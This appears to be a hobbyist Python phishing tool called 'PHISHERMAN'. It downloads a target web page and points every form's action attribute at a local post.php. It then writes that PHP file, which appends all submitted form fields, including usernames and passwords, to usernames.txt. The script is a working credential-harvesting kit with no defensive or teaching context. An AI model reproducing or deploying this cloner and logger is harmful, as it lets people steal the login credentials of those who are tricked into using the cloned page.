import requests
import re
from colorama import Fore
from bs4 import BeautifulSoup as bs
import os
os.system('clear')
print('''
█▀█ █░█ █ █▀ █░█ █▀▀ █▀█ █▀▄▀█ ▄▀█ █▄░█
█▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄ █░▀░█ █▀█ █░▀█
''')
print("made by p0syd0n")

url=input('url>> ')
parameter = "action=\""
print(f"reviced url{url}")
# css_files = []
# for css in soup.find_all("link"):
#     if css.attrs.get("href"):
#         # if the link tag has the 'href' attribute
#         css_url = urljoin(url, css.attrs.get("href"))
#         css_files.append(css_url)
# print(css_files)


# session = requests.Session()
# session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

# # get the HTML content
# html = session.get(url).content

# # parse HTML using beautiful soup
# soup = bs(html, "html.parser")
# print(soup)


try:
  r = requests.get(url)
  print(Fore.GREEN + f"[+] Got url {url}")
  print(r.text)
except Exception as e:
  print(Fore.RED + f"[-] Error getting url {url}. Show full error? y/n")
  if input(">> ") == "y":
    print(e)
  else:
    print(Fore.RED + "process terminated")


    
print("save to .html or .txt file? h/t")
choice = input(">> ")
if choice == 'h':
  
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.html', 'w') as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
    with open('post.php', 'w') as post:
      post.write('''
<?php $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {    fwrite($handle, $variable);    fwrite($handle, "=");    fwrite($handle, $value);    fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; 
?>
      ''')
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)








if choice == 't' :
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.txt', "w") as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
      
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)



else:
  if parameter in r.text:
    print("parameter detected")
    
    with open('index.php', 'w') as source_code:
      print(r.text.index(parameter)) 
      source_code.write(re.sub(f'{parameter}?(.*?)\"', "action=\"post.php\"", r.text, flags=re.DOTALL))
      source_code.close()
      
  else:
    print(Fore.RED + '[-] No action parameter in url:')
    print(url)
    


#https://tests.posydon.repl.co

#phone died
